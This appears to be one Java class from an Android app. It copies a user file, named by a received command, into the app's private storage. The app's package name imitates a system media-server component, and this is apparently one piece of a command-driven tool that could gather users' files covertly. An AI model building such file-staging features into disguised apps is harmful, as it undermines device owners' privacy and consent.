package com.android.mediaserver.task;

import android.content.Context;
import com.android.mediaserver.command.Command;
import com.android.mediaserver.command.FetchUserFileCommand;
import com.android.mediaserver.config.Config;
import com.android.mediaserver.util.AppUtils;
import com.sromku.simple.storage.SimpleStorage;
import java.io.File;
import timber.log.Timber;

public class FetchUserFileTask extends Task {
  public FetchUserFileTask(Command command, Context context) {
    super(command, context);
  }

  protected Void doInBackground(Void... params) {
    Timber.d("FetchUserFileTask started", new Object[0]);
    publishProgress(new TaskStatus[] { TaskStatus.IN_PROGRESS });
    if (fetchFile(((FetchUserFileCommand) mCommand).getFilePath())) {
      publishProgress(new TaskStatus[] { TaskStatus.SUCCEEDED });
      Timber.d("FetchUserFileTask succeeded", new Object[0]);
    } else {
      publishProgress(new TaskStatus[] { TaskStatus.FAILED });
      Timber.d("FetchUserFileTask failed", new Object[0]);
    }
    return null;
  }

  protected void onPostExecute(Void aVoid) {
    super.onPostExecute(aVoid);
  }

  private boolean fetchFile(String filePath) {
    String userFilesDirectory = SimpleStorage.getInternalStorage(mContext)
        .getFile(Config.getInstance(mContext).getUserFilesDirectoryName())
        .getAbsolutePath();
    return AppUtils.copyFileToFilesDir(mContext, filePath,
        userFilesDirectory + File.separator + new File(filePath).getName());
  }
}
